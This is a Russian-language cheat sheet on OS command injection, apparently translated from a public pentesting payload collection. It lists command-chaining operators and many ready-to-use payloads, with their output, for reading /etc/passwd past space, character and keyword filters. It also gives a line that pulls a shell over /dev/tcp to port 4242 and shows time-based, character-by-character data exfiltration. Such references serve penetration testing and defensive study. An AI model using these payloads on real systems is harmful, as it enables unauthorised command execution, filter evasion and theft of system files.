## CMDi Внедрение команд

> Внедрение команд — это уязвимость безопасности, которая позволяет злоумышленнику выполнять произвольные команды внутри уязвимого приложения.

## Инструменты

* commixproject/commix — автоматизированный универсальный инструмент для внедрения и использования команд ОС.
* projectdiscovery/interactsh — серверная и клиентская библиотека, собирающая взаимодействие OOB.


Внедрение команд, также известное как внедрение оболочки, — это тип атаки, при которой злоумышленник может выполнять произвольные команды в операционной системе хоста через уязвимое приложение. Эта уязвимость может существовать, когда приложение передает небезопасные данные, предоставленные пользователем (формы, файлы cookie, HTTP-заголовки и т. д.), в системную оболочку. В этом контексте системная оболочка представляет собой интерфейс командной строки, который обрабатывает команды, которые необходимо выполнить, обычно в системах Unix или Linux.


Во многих интерфейсах командной строки, особенно в Unix-подобных системах, есть несколько символов, которые можно использовать для объединения команд или управления ими.

* ; (Точка с запятой): позволяет последовательно выполнять несколько команд.
* && (И): выполнить вторую команду только в том случае, если первая команда выполнена успешно (возвращает нулевой статус выхода).
* || (ИЛИ): выполнять вторую команду только в случае сбоя первой команды (возвращает ненулевой статус выхода).
* & (Фоновый режим): выполнение команды в фоновом режиме, позволяющее пользователю продолжать использовать оболочку.
* | (Канал): принимает выходные данные первой команды и использует их в качестве входных данных для второй команды.
  
```powershell
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
```

* Внедрение команд с помощью обратных кавычек.
  
  ```bash
  original_cmd_by_server `cat /etc/passwd`
  ```
* Внедрение команд с помощью замены
  
  ```bash
  original_cmd_by_server $(cat /etc/passwd)
  ```

## Обходы фильтров
### Обход без пробела
* `$IFS` — это специальная переменная оболочки, называемая внутренним разделителем полей. По умолчанию во многих оболочках он содержит пробельные символы (пробел, табуляция, новая строка). При использовании в команде оболочка интерпретирует `$IFS` как пространство. `$IFS` не работает напрямую в качестве разделителя в таких командах, как `ls`, `wget`; использовать `${IFS}` вместо.

 ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```

* В некоторых оболочках раскрытие скобок генерирует произвольные строки. При выполнении оболочка будет рассматривать элементы внутри фигурных скобок как отдельные команды или аргументы.

  ```powershell
  {cat,/etc/passwd}
  ```

* Перенаправление ввода. Символ < сообщает оболочке прочитать содержимое указанного файла.

  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```
* Цитирование ANSI-C
  
  ```powershell
  X=$'uname\x20-a'&&$X
  ```

* Символ табуляции иногда можно использовать как альтернативу пробелам. В ASCII символ табуляции представлен шестнадцатеричным значением. 09.

  ```powershell
  ;ls%09-al%09/home
  ```

* В Windows %VARIABLE:~start,length% — это синтаксис, используемый для операций с подстроками над переменными среды.

  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```

### Обход с возвратом линии

Команды также можно запускать последовательно с символами новой строки.

```bash
original_cmd_by_server
ls
```

### Обход с помощью обратной косой черты новой строки
* Команды можно разбить на части, используя обратную косую черту, за которой следует перевод строки.

  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```
* Форма в кодировке URL будет выглядеть так:

  ```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
  ```


### Обход фильтра символов через шестнадцатеричную кодировку

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### Обход фильтра символов

Выполнение команд без обратной косой черты и косой черты — linux bash

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

## Обход слов из черного списка

### Обход с одинарной кавычкой

```powershell
w'h'o'am'i
wh''oami
'w'hoami
```
### Обход с двойной кавычкой
```powershell
w"h"o"am"i
wh""oami
```

### Обход с обратными кавычками
```powershell
wh``oami
```
### Обход с помощью обратной косой черты и косой черты
```powershell
w\ho\am\i
/\b\i\n/////s\h
```
### Обход с помощью $@

`$0`: Относится к имени сценария, если он запускается как сценарий. Если вы находитесь в сеансе интерактивной оболочки, $0 обычно дает имя оболочки.

```powershell
who$@ami
echo whoami|$0
```

### Обход с помощью $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

### Байпас с переменным расширением


```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### Обход с подстановочными знаками

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```
## Эксфильтрация данных
### Эксфильтрация данных по времени

* Извлечение данных: посимвольно

 ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  real    0m5.007s
  user    0m0.000s
  sys 0m0.000s
  ```

* Incorrect value: no delay
  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
  real    0m0.002s
  user    0m0.000s
  sys 0m0.000s
  ```

Ссылки

    SECURITY CAFÉ — использование RCE на основе времени
    Опрос Bug Bounty — Windows RCE без пробелов
    Без PHP, без пробелов, без $, без { }, только bash - @asdizzle
    #bash #обфускация путем манипуляции со строками — Malwrologies, @DissectMalware
    Что такое внедрение команд ОС —portswigger
    Векторы внедрения аргументов — Сонар
